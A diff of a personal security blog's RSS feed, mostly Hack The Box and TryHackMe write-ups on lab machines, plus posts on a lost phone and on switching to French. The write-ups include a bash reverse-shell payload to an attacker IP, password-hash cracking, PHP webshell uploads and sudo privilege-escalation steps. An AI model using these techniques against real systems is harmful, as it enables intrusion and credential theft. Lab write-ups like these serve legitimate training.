@@ -1,18 +1,18 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>Masoopy</title><link>https://www.masoopy.com/</link><description>Masoopy</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 19 Jan 2022 22:27:57 +0100</lastBuildDate><atom:link href="https://www.masoopy.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Lost in Translation</title><link>https://www.masoopy.com/lost-in-translation/</link><pubDate>Wed, 19 Jan 2022 22:27:57 +0100</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/lost-in-translation/</guid><description><![CDATA[<div class="featured-image">
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>Masoopy</title><link>https://www.masoopy.com/</link><description>This is my cool site</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 19 Jan 2022 22:27:57 +0100</lastBuildDate><atom:link href="https://www.masoopy.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Lost in Translation</title><link>https://www.masoopy.com/lost-in-translation/</link><pubDate>Wed, 19 Jan 2022 22:27:57 +0100</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/lost-in-translation/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2022/01/Lost_in_translation.png" referrerpolicy="no-referrer">
             </div><p>I have been blogging on and off for a while now. Most of the time I did it in English, which is, as you may have guessed, not my mother tongue.</p>
 <h2 id="the-old-king">The old King</h2>
 <p>I did so, because English is the main language for tech, and I blog about tech. This seemed like an obvious choice. However, I am about to change that. Indeed, starting now, I&rsquo;ll blog (mainly) in French. I want to get back to my &ldquo;roots&rdquo;. I feel like I have been losing touch with my mother tongue. Reading a lot in English, writing in English too, speaking Frenglish all day&hellip; I no longer know how to write well in French (even though I currently live in France).</p>
 <h2 id="a-new-beginning">A new beginning</h2>
-<p>So 2022, might not be <a href="https://www.zdnet.com/article/why-there-will-never-be-a-year-of-the-linux-desktop/" target="_blank" rel="noopener noreferrer">the year of the Linux desktop</a>, but hopefully it will be the year of my blog being written in French.</p>
+<p>So 2022, might not be <a href="https://www.zdnet.com/article/why-there-will-never-be-a-year-of-the-linux-desktop/" target="_blank" rel="noopener noreffer ">the year of the Linux desktop</a>, but hopefully it will be the year of my blog being written in French.</p>
 <p>By going to the top right corner of the webpage, you can select language. For now, the French website will look empty, whereas the English version will look like an archive of the old content. This looks a bit odd at first, but actually makes senses : an old archived English project and new French one to start !</p>
 <p>Small added bonus, it won&rsquo;t impact SEO for existing content!</p>
-]]></description></item><item><title>HTB - Armageddon without MetaSploit</title><link>https://www.masoopy.com/htb-armageddon-without-metasploit/</link><pubDate>Sat, 31 Jul 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-armageddon-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>HTB - Armageddon without MetaSploit</title><link>https://www.masoopy.com/htb-armageddon-without-metasploit/</link><pubDate>Sat, 31 Jul 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-armageddon-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/07/Armageddon_Logo.png" referrerpolicy="no-referrer">
             </div><h2 id="intro">Intro</h2>
 <p>During this box, we&rsquo;ll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I&rsquo;ll get privesc thanks to an insecure sudo command (once again).</p>
 <h2 id="target">Target</h2>
-<p><a href="https://app.hackthebox.eu/machines/323" target="_blank" rel="noopener noreferrer">HTB - Armageddon</a></p>
+<p><a href="https://app.hackthebox.eu/machines/323" target="_blank" rel="noopener noreffer ">HTB - Armageddon</a></p>
 <h2 id="recon">Recon</h2>
 <p>A quick look to the box info reveals it&rsquo;s running Linux.</p>
 <h2 id="enum">Enum</h2>
@@ -82,7 +82,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
 </div><p>The above scans confirms we are facing a Linux box with only Apache and SSH running.</p>
 <p>The <code>CHANGELOG.txt</code> shows a <code>Drupal 7.56</code> version :</p>
 <p></p>
-<p>After a quick look on <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">exploitDB</a>, we&rsquo;ll notice that this version should be vulnerable to <code>Drupalgeddon2</code>.</p>
+<p>After a quick look on <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreffer ">exploitDB</a>, we&rsquo;ll notice that this version should be vulnerable to <code>Drupalgeddon2</code>.</p>
 <p>Let&rsquo;s see!</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>NB: I like to use searchsploit directly in my terminal, it makes it easier to show an exploit with <code>searchsploit -x relative_path</code> and <code>searchsploit -m relative_path</code> in order to mirror (eg. copy the exploit in my current directory).</p>
@@ -135,7 +135,7 @@ c=bash+-i+&gt;%26+/dev/tcp/10.10.14.11/443+0&gt;%261
 <p><code>mysqldump -u drupaluser -p drupal &gt; plop.sql</code></p>
 <p>We now look inside the dump and search for user&rsquo;s information :</p>
 <p></p>
-<p>It appears our user is called <code>brucetherealadmin</code> and it&rsquo;s hash starts with <code>$S$</code> according to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreferrer">hashcat</a>, it is a Drupal 7 hash, which we can confirm it is!</p>
+<p>It appears our user is called <code>brucetherealadmin</code> and it&rsquo;s hash starts with <code>$S$</code> according to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreffer ">hashcat</a>, it is a Drupal 7 hash, which we can confirm it is!</p>
 <p>Now to crack it :</p>
 <p><code>hashcat -m 7900 arma.hash /usr/share/wordlists/rockyou.txt</code></p>
 <p>After a little while, the password will be cracked :</p>
@@ -147,18 +147,18 @@ c=bash+-i+&gt;%26+/dev/tcp/10.10.14.11/443+0&gt;%261
 <p>Now that we are in, the first thing I like to do is checking if I have <code>sudo</code>&rsquo;s rights. This might be an easy win and it is a lot quieter than running a script such as <code>LinPeas</code>.</p>
 <p>Bruce can indeed run <code>sudo snap install</code> :</p>
 <p></p>
-<p>When I first did the box, there was nothing on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFObins</a>, but since there is today, let&rsquo;s do it the easy way!</p>
+<p>When I first did the box, there was nothing on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer ">GTFObins</a>, but since there is today, let&rsquo;s do it the easy way!</p>
 <p>We simply modify the first line, replacing <code>id</code> command with <code>cat /root/root.txt</code>.</p>
 <p>Finally, we run it like : <code>sudo snap install plop_1.0_all.snap --dangerous --devmode</code> in order to get root&rsquo;s flag:</p>
 <p></p>
 <h2 id="outro">Outro</h2>
 <p>I remember loving the first part until user&hellip; but the last part was just horrible. I hated it ! It was actually so painful, that I didn&rsquo;t take any note on the privesc and didn&rsquo;t even planned to do the writeup&hellip; but here I am!</p>
-]]></description></item><item><title>HTB - Spectra without MetaSploit</title><link>https://www.masoopy.com/htb-spectra-without-metasploit/</link><pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-spectra-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>HTB - Spectra without MetaSploit</title><link>https://www.masoopy.com/htb-spectra-without-metasploit/</link><pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-spectra-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/07/Spectra_Logo.png" referrerpolicy="no-referrer">
             </div><h2 id="intro">Intro</h2>
 <p>This is an easy Linux box, where I had to get user through a forgotten &ldquo;backup&rdquo; on a dev instance, then the privesc came from an unsecured sudo command&hellip; Sounds straightforward ? Well, not that much!</p>
 <h2 id="target">Target</h2>
-<p><a href="https://app.hackthebox.eu/machines/317" target="_blank" rel="noopener noreferrer">HTB - Spectra</a></p>
+<p><a href="https://app.hackthebox.eu/machines/317" target="_blank" rel="noopener noreffer ">HTB - Spectra</a></p>
 <h2 id="recon">Recon</h2>
 <p>A quick look to the box info reveals that it is a Linux&rsquo;s box, and that&rsquo;s it!</p>
 <h2 id="enum">Enum</h2>
@@ -266,7 +266,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 ===============================================================
 </code></pre></td></tr></table>
 </div>
-</div><p>Main page shows 2 links pointing to <a href="http://spectra.htb" target="_blank" rel="noopener noreferrer">spectra.htb</a>, this means I need to modify our <code>/etc/hosts</code> file accordingly. One instance (main) is a working Wordpress, and the other one (testing) is a broken Wordpress.</p>
+</div><p>Main page shows 2 links pointing to <a href="http://spectra.htb" target="_blank" rel="noopener noreffer ">spectra.htb</a>, this means I need to modify our <code>/etc/hosts</code> file accordingly. One instance (main) is a working Wordpress, and the other one (testing) is a broken Wordpress.</p>
 <p>Once this is done, I would generally run a few more <code>gobuster</code> scans in the background against those two instances and a <code>WPScan</code> on the working Wordpress :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -450,7 +450,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:09
 </code></pre></td></tr></table>
 </div>
-</div><p>This scan didn&rsquo;t reveal anything useful, I also tried to brute force <code>administrator</code> user with a top 1000 passwords list from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists</a>. No luck.</p>
+</div><p>This scan didn&rsquo;t reveal anything useful, I also tried to brute force <code>administrator</code> user with a top 1000 passwords list from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreffer ">SecLists</a>. No luck.</p>
 <p>I decided to run the <code>WPScan</code> first, while browsing manually the other (testing) instance. Pretty quickly, I figured out that <code>directory listing</code> was enabled on this instance, this means that browsing to <code>http://spectra.htb/testing/</code> instead of <code>http://spectra.htb/testing/index.php</code> gave me the full listing of files on the web root.</p>
 <p>From here, I could spot a <code>wp-config.php.save</code> file that contained credentials to connect to the database.</p>
 <p>I tried connecting remotely, but MySQL wouldn&rsquo;t allow me to connect from my IP.</p>
@@ -463,24 +463,24 @@ Interesting Finding(s):
 <p><code>curl http://spectra.htb/main/themes/twentyseven/404.php&amp;nes=whoami</code></p>
 <p>From here, I like to use Burp, convert the request to <code>POST</code> and play around or simply get a better shell.</p>
 <p>On this particular box, I had several issues trying to get a proper shell.</p>
-<p>I decided to upload a full php reverse shell via curl&hellip; I then reached that URL to get my reverse shell, and&hellip; I couldn&rsquo;t <a href="https://www.masoopy.com/cheatsheets/uprgrading-shells/" target="_blank" rel="noopener noreferrer">upgrade it</a>! However, I noticed that <code>nginx</code> user had a real shell inside <code>/etc/passwd</code>, so I uploaded my <code>ssh key</code> and connected as <code>nginx</code> over <code>SSH</code>!</p>
+<p>I decided to upload a full php reverse shell via curl&hellip; I then reached that URL to get my reverse shell, and&hellip; I couldn&rsquo;t <a href="https://www.masoopy.com/cheatsheets/uprgrading-shells/" target="_blank" rel="noopener noreffer ">upgrade it</a>! However, I noticed that <code>nginx</code> user had a real shell inside <code>/etc/passwd</code>, so I uploaded my <code>ssh key</code> and connected as <code>nginx</code> over <code>SSH</code>!</p>
 <p>From here, I ran <code>LinPeas</code> and spotted (not easily) and interesting file : <code>/etc/autologin/passwd</code></p>
 <h4 id="getting-user">Getting user</h4>
 <p>The password found allowed me to log in as <code>katie</code> via ssh, and allowed me to grab the <code>user flag</code> :</p>
 <p></p>
 <h3 id="privesc">PrivEsc</h3>
-<p>Now that I have user, let&rsquo;s see if I can run sudo, and indeed I can run <code>sudo /sbin/initctl</code> without password. I headed over <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFObins</a>, but unfortunately there was nothing there.</p>
+<p>Now that I have user, let&rsquo;s see if I can run sudo, and indeed I can run <code>sudo /sbin/initctl</code> without password. I headed over <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer ">GTFObins</a>, but unfortunately there was nothing there.</p>
 <p>After a little exploration, I noticed that I could <code>edit</code> / <code>start</code> / <code>stop</code> services in <code>/etc/init/</code>, and found a particularly interesting one called test.conf.</p>
 <p></p>
 <p>After more trial and errors, I simply decided to replace the <code>date</code> command by <code>cat /root/root.txt</code>, which got me the <code>root flag</code> from log file in <code>/var/log/nodetest.log</code> :</p>
 <p></p>
 <h2 id="outro">Outro</h2>
 <p>This was another fun with quite a few unexpected hurdles. It was really cool to &ldquo;think out of the box&rdquo; and try to find (ugly) ways to overcome those issues.</p>
-]]></description></item><item><title>HTB - ScriptKiddie</title><link>https://www.masoopy.com/htb-scriptkiddie/</link><pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-scriptkiddie/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>HTB - ScriptKiddie</title><link>https://www.masoopy.com/htb-scriptkiddie/</link><pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-scriptkiddie/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/06/SK_Logo.png" referrerpolicy="no-referrer">
             </div><h2 id="intro">Intro</h2>
 <h2 id="target">Target</h2>
-<p><a href="https://app.hackthebox.eu/machines/314" target="_blank" rel="noopener noreferrer">HTB - ScriptKiddie</a></p>
+<p><a href="https://app.hackthebox.eu/machines/314" target="_blank" rel="noopener noreffer ">HTB - ScriptKiddie</a></p>
 <h2 id="recon">Recon</h2>
 <p>Initial recon tells us the box is running Linux, and that&rsquo;s about it!</p>
 <h2 id="enum">Enum</h2>
@@ -533,11 +533,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div>
 </div><p>From this we discover an <code>SSH</code> service and a <code>Python webserver</code> on port 5000. It also confirms we are facing a Linux box.</p>
 <p>Manually browsing to the website, we find that there are 3 tools : <code>nmap</code>, <code>searchsploit</code> anf <code>msfvenom</code>. After a few tries with <code>ffuf</code>, and <code>gobuster</code>, we couldn&rsquo;t find anything interesting.</p>
-<p>However, after a quick search, <code>msfvenom</code> might be <a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/" target="_blank" rel="noopener noreferrer">vulnerable</a>.</p>
+<p>However, after a quick search, <code>msfvenom</code> might be <a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/" target="_blank" rel="noopener noreffer ">vulnerable</a>.</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>Let&rsquo;s test our theory and see if we can get a shell.</p>
 <h3 id="getting-initial-shell">Getting Initial Shell</h3>
-<p>In order to do so, we will fire up <code>MetaSploit</code> and generate a payload (we could also <a href="https://www.exploit-db.com/exploits/49491" target="_blank" rel="noopener noreferrer">download</a> a payload and slightly modify it).</p>
+<p>In order to do so, we will fire up <code>MetaSploit</code> and generate a payload (we could also <a href="https://www.exploit-db.com/exploits/49491" target="_blank" rel="noopener noreffer ">download</a> a payload and slightly modify it).</p>
 <p>We then upload the payload as an Android template and before submitting it, let&rsquo;s not forget to start ar listener like so : <code>nc -nlvp 9001</code> (or your usual port). Let&rsquo;s, now, submit the request, and you should get a shell back as use kid. From here, I like to generate an ssh key and add it to the <code>.ssh/authorized_keys</code> for easier access.</p>
 <p>Once this is done, I have a proper shell and way to come back easily.</p>
 <p>Let&rsquo;s grab <code>user</code>&rsquo;s flag:</p>
@@ -596,15 +596,15 @@ if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
 <p></p>
 <h2 id="outro">Outro</h2>
 <p>This was quite a fun box, with a few extra steps for an &ldquo;easy&rdquo; machine. It also shows that hackers can be hacked! ;)</p>
-]]></description></item><item><title>Lessons learned from a lost phone</title><link>https://www.masoopy.com/lessons-learned-from-a-lost-phone/</link><pubDate>Tue, 04 May 2021 08:26:09 +0200</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/lessons-learned-from-a-lost-phone/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>Lessons learned from a lost phone</title><link>https://www.masoopy.com/lessons-learned-from-a-lost-phone/</link><pubDate>Tue, 04 May 2021 08:26:09 +0200</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/lessons-learned-from-a-lost-phone/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/05/lost-phone.jpg" referrerpolicy="no-referrer">
             </div><p>For the first time in my life, a few days ago, I lost my phone and it was most probably stolen a few minutes later&hellip; So what went wrong, and what went right and how is a life without a phone in 2020?</p>
 <h2 id="what-went-wrong">What went wrong?</h2>
 <p>I lost my phone, this is clearly what went wrong! Ok, just kidding, I&rsquo;ll tell you what went really wrong once I no longer had my phone.</p>
 <p>I am almost pretty sure that I lost it / forgot it somewhere, and that someone stole it right away. Phone was on and I was using it at some point, I still have timestamp of my last sent message, then a few minutes after, I no longer have my phone. When someone tried to call me right away, it went straight to voicemail.</p>
 <p>So, what really went wrong?</p>
-<p>First of all, I didn&rsquo;t had a PIN code on my SIM card. I felt it was so 1990 and thought that with unlimited data, calls, and SMS on my plan, losing my SIM was low risk. I was wrong. The risk here is that someone with access to my SIM could call a pay-per-minute line, even a line the thief would have set-up himself. This could easily cause several hundreds or a few thousands Euro damage as we can learn from the <a href="https://darknetdiaries.com/episode/1/" target="_blank" rel="noopener noreferrer">first episode of Darknet Diaries</a>.</p>
-<p>This meant I had to suspend my line right away to avoid additional costs! This also meant that with my line now suspended, I could no longer use feature to locate my phone and remotely erase it, such as <a href="https://www.google.com/android/find" target="_blank" rel="noopener noreferrer">Android Find</a> and <a href="https://www.apple.com/icloud/find-my/" target="_blank" rel="noopener noreferrer">Find My Apple</a>.</p>
+<p>First of all, I didn&rsquo;t had a PIN code on my SIM card. I felt it was so 1990 and thought that with unlimited data, calls, and SMS on my plan, losing my SIM was low risk. I was wrong. The risk here is that someone with access to my SIM could call a pay-per-minute line, even a line the thief would have set-up himself. This could easily cause several hundreds or a few thousands Euro damage as we can learn from the <a href="https://darknetdiaries.com/episode/1/" target="_blank" rel="noopener noreffer ">first episode of Darknet Diaries</a>.</p>
+<p>This meant I had to suspend my line right away to avoid additional costs! This also meant that with my line now suspended, I could no longer use feature to locate my phone and remotely erase it, such as <a href="https://www.google.com/android/find" target="_blank" rel="noopener noreffer ">Android Find</a> and <a href="https://www.apple.com/icloud/find-my/" target="_blank" rel="noopener noreffer ">Find My Apple</a>.</p>
 <p>My phone was locked with a 6 chars PIN, plus I suppose it was quickly turned off by the thief, considering how fast it went offline, and it requires a needle to remove the SIM. So, I decided my data inside was probably safe (I also had another trick in my sleeve, more on that later) and the real risk was to avoid extra cost and usurpation by someone having access to my phone line.</p>
 <p>I have a backup phone, but no extra SIM. It is an old phone and a &ldquo;transitional&rdquo; phone. I keep it when I have hardware issue / break current phone, etc. I just have to put the SIM card in it, and everything is set up. It already served its purpose a few times!</p>
 <p>So I tried to buy a new phone on Amazon (where I usually buy too many stuff).</p>
@@ -614,7 +614,7 @@ if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
 <p>Hopefully, the rest went fine !</p>
 <h2 id="what-went-right">What went right?</h2>
 <p>Wherever I can, I use TOTP tokens as 2FA instead of text message. I have read horror stories about phone lines being &ldquo;defaced&rdquo;, and decided a long time ago that phone verification wasn&rsquo;t a safe thing to do.</p>
-<p>Now, just doing that isn&rsquo;t enough, because if you only have one authenticator app and if it is on your phone, then you are toasted! I use multiple instances of different authenticators. I have <a href="https://authy.com/" target="_blank" rel="noopener noreferrer">Authy</a> on my phone AND on my desktop, and also <a href="https://bitwarden.com/help/article/authenticator-keys/" target="_blank" rel="noopener noreferrer">Bitwarden</a> self hosted. This means, that without my phone, I can continue to log in any 2FA websites.</p>
+<p>Now, just doing that isn&rsquo;t enough, because if you only have one authenticator app and if it is on your phone, then you are toasted! I use multiple instances of different authenticators. I have <a href="https://authy.com/" target="_blank" rel="noopener noreffer ">Authy</a> on my phone AND on my desktop, and also <a href="https://bitwarden.com/help/article/authenticator-keys/" target="_blank" rel="noopener noreffer ">Bitwarden</a> self hosted. This means, that without my phone, I can continue to log in any 2FA websites.</p>
 <p>As I told you before, I was pretty confident my data was safe. I believe the thief went for the device and not the data itself, plus the phone was locked, etc.</p>
 <p>However, I still have sensitive data and access granted to all my accounts : mail, Nextcloud, VPN access, etc.</p>
 <p>I simply logged into all my accounts from my computer and revoked all accesses for the phone and then disconnected all sessions (this is where the authenticator was need to log back in from my main computer), and of course revoked my VPN access.</p>
@@ -625,13 +625,13 @@ if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
 <p>As an end note, I&rsquo;d like to point out how it is to live without a phone in 2020s. In my case, I am currently out of my home the whole week : monday to friday, nights included.</p>
 <p>Want to order sushi? Need a phone to receive a text message to confirm payment, or a landline to call the restaurant. Want to order a new phone? Probably need a new phone as well&hellip; Not a home and no clock nor watch? Need a phone as well! Sending a quick message via Telegram or the like? Well, a phone is still easier ! Need internet access for your laptop because you are not home? A phone will come handy, once again&hellip; Have a few phone calls to do? Well&hellip;</p>
 <p>While it wasn&rsquo;t as hard as I thought it would be, living without a phone nowadays can still be tricky.</p>
-]]></description></item><item><title>THM - DailyBugle without MetaSploit</title><link>https://www.masoopy.com/thm-dailybugle-without-metasploit/</link><pubDate>Wed, 17 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-dailybugle-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>THM - DailyBugle without MetaSploit</title><link>https://www.masoopy.com/thm-dailybugle-without-metasploit/</link><pubDate>Wed, 17 Mar 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/thm-dailybugle-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/03/DailyBugle_Logo.png" referrerpolicy="no-referrer">
             </div><h2 id="intro">Intro</h2>
-<p>This box looks promising, featuring a real life CMS, <a href="https://www.joomla.org/" target="_blank" rel="noopener noreferrer">Joomla</a>, and one that is quite often in the wild too! It is even a CMS I used several years ago, for one of my blog!</p>
+<p>This box looks promising, featuring a real life CMS, <a href="https://www.joomla.org/" target="_blank" rel="noopener noreffer ">Joomla</a>, and one that is quite often in the wild too! It is even a CMS I used several years ago, for one of my blog!</p>
 <p>Let&rsquo;s see right now, if we can get in!</p>
 <h2 id="target">Target</h2>
-<p><a href="https://tryhackme.com/room/dailybugle" target="_blank" rel="noopener noreferrer">THM - DailyBugle</a></p>
+<p><a href="https://tryhackme.com/room/dailybugle" target="_blank" rel="noopener noreffer ">THM - DailyBugle</a></p>
 <h2 id="recon">Recon</h2>
 <p>Quick recon according to logo and info :</p>
 <ul>
@@ -703,7 +703,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
 <p>Manually browsing to the website confirms a Joomla website. Let&rsquo;s run <code>joomscan</code> in order to gather more info. We are especially interested about the version. Since we are looking for a known SQL injection.</p>
 <p>After a few seconds, it happens our target is running <code>Joomla 3.7.0</code> :</p>
 <p></p>
-<p>According to <a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener noreferrer">exploit-db</a>, which confirms the <code>SQLi</code>, we can now run <code>sqlmap</code> like shown below:</p>
+<p>According to <a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener noreffer ">exploit-db</a>, which confirms the <code>SQLi</code>, we can now run <code>sqlmap</code> like shown below:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -713,7 +713,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
 </code></pre></td></tr></table>
 </div>
 </div><p>While having this info is cool, it looks tedious to get what I am looking for.</p>
-<p>Doing a little more research for an easy win, I came across a <a href="https://github.com/stefanlucas/Exploit-Joomla" target="_blank" rel="noopener noreferrer">Python script</a> to exploit this vuln, and it directly returned juicy info :</p>
+<p>Doing a little more research for an easy win, I came across a <a href="https://github.com/stefanlucas/Exploit-Joomla" target="_blank" rel="noopener noreffer ">Python script</a> to exploit this vuln, and it directly returned juicy info :</p>
 <p></p>
 <p>Looking on internet, this hash appears to be bcrypt, so let&rsquo;s try to crack it with hashcat:</p>
 <div class="highlight"><div class="chroma">
@@ -726,7 +726,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
 </div>
 </div><p>After a little while, it worked :</p>
 <p></p>
-<p>Doing a little more internet research, I found that there is another vuln in Joomla that allows an <a href="https://vk9-sec.com/reverse-shell-on-any-cms/" target="_blank" rel="noopener noreferrer">admin user to get reverse shell</a>&hellip;</p>
+<p>Doing a little more internet research, I found that there is another vuln in Joomla that allows an <a href="https://vk9-sec.com/reverse-shell-on-any-cms/" target="_blank" rel="noopener noreffer ">admin user to get reverse shell</a>&hellip;</p>
 <h3 id="getting-initial-shell">Getting Initial Shell</h3>
 <p>According to the link above, I edited a php file from an existing theme, replacing it with a <code>PHP reverse shell</code> (the one from Kali / Parrot, located in <code>/usr/share/webshell</code>), saved it, and called the URL : <code>http://$target_ip/templates/beez3/index.php</code> where <code>beez3</code> is the theme&rsquo;s name and <code>index.php</code> the file I edited.</p>
 <p>It got me my foothold :</p>
@@ -737,12 +737,12 @@ Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
 <p>After a little while, it discovered interesting information such as <code>jjameson</code> user, a password in Joomla&rsquo;s <code>configuration.php</code>, and other things&hellip; As always, I was looking for an easy win, and tried to connect via SSH with the credentials I found&hellip; and it worked!</p>
 <p>I was now, in as <code>jjameson</code> with a real shell, stable connection and easy way to come back in!</p>
 <p>First command I issued was <code>sudo -l</code> in order to see if I could do anything as <code>root</code>. It turns out, I was allowed to run <code>yum</code>, which was very promising.</p>
-<p>A quick look at <a href="https://gtfobins.github.io/gtfobins/yum/#sudo" target="_blank" rel="noopener noreferrer">GTFObins</a> confirmed another easy win was probably coming. I simply copied/pasted (but also analyzed it, to make sure I understood what it did; there is no learning if you blindly copy/paste) the bits of code, and got a <code>root shell</code> :</p>
+<p>A quick look at <a href="https://gtfobins.github.io/gtfobins/yum/#sudo" target="_blank" rel="noopener noreffer ">GTFObins</a> confirmed another easy win was probably coming. I simply copied/pasted (but also analyzed it, to make sure I understood what it did; there is no learning if you blindly copy/paste) the bits of code, and got a <code>root shell</code> :</p>
 <p></p>
 <h2 id="outro">Outro</h2>
 <p>I found this box quite &ldquo;straightforward&rdquo; and very fun : chaining multiple vulns, in order to get a shell, then user misconfiguration in order to pwn a specific user and finally become <code>root</code>!</p>
 <p>I am pretty sure, there are other ways to get <code>root</code> on this box (maybe with <code>kernel</code>, or <code>sudo</code> directly), but for once, I wanted to go the &ldquo;intended&rdquo; way.</p>
-]]></description></item><item><title>HTB - Bastard without MetaSploit</title><link>https://www.masoopy.com/htb-bastard-without-metasploit/</link><pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-bastard-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+]]></description></item><item><title>HTB - Bastard without MetaSploit</title><link>https://www.masoopy.com/htb-bastard-without-metasploit/</link><pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-bastard-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/03/Bastard_Logo.png" referrerpolicy="no-referrer">
             </div><h2 id="intro">Intro</h2>
 <p>Let&rsquo;s up the game a little bit and attack a medium rated box for the very first time!</p>
@@ -842,7 +842,7 @@ Nmap done: 1 IP address (1 host up) scanned in 157.23 seconds
 </code></pre></td></tr></table>
 </div>
 </div><p>We also run our team of usual&rsquo;s suspects tools, such as <code>nikto</code> and <code>gobuster</code> and manually <code>browsing</code> with <code>Burp</code> enabled.</p>
-<p>We&rsquo;ll notice a <code>Drupal 7.54</code> installation which is vulnerable to <a href="https://github.com/dreadlocked/Drupalgeddon2" target="_blank" rel="noopener noreferrer">Drupalgeddon 2</a> :</p>
+<p>We&rsquo;ll notice a <code>Drupal 7.54</code> installation which is vulnerable to <a href="https://github.com/dreadlocked/Drupalgeddon2" target="_blank" rel="noopener noreffer ">Drupalgeddon 2</a> :</p>
 <p></p>
 <h2 id="exploitation">Exploitation</h2>
 <h3 id="getting-initial-shell">Getting Initial Shell</h3>
@@ -851,9 +851,9 @@ Nmap done: 1 IP address (1 host up) scanned in 157.23 seconds
 <p>It is now time for internal recon, before we try to escalate our privs!</p>
 <h3 id="privesc">PrivEsc</h3>
 <p>Since our shell is quite limited, we&rsquo;ll have to find several to get what we want. For example, running winpeas and similar tools won&rsquo;t work. It will time out before we can get the results, and I couldn&rsquo;t find a way to write the output to a logfile.</p>
-<p>After searching, I found <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreferrer">Windows Exploit Suggester</a>. It is a <code>python2 script</code> that works on my attacking machine from the output of the <code>systeminfo</code> command :</p>
+<p>After searching, I found <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreffer ">Windows Exploit Suggester</a>. It is a <code>python2 script</code> that works on my attacking machine from the output of the <code>systeminfo</code> command :</p>
 <p></p>
-<p>So going down the list I found one kernel exploit that seemed particularly interesting : <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener noreferrer">MS10-059</a>.</p>
